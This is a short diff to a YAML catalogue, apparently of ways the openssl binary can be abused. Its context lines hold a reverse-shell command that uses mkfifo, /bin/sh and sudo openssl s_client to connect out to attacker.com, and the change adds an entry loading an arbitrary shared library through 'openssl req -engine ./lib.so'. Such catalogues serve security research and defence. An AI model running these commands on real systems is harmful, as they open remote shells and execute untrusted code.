@@ -79,4 +79,6 @@ functions:
         RHOST=attacker.com
         RPORT=12345
         mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+  library-load:
+    - code: openssl req -engine ./lib.so
 ---
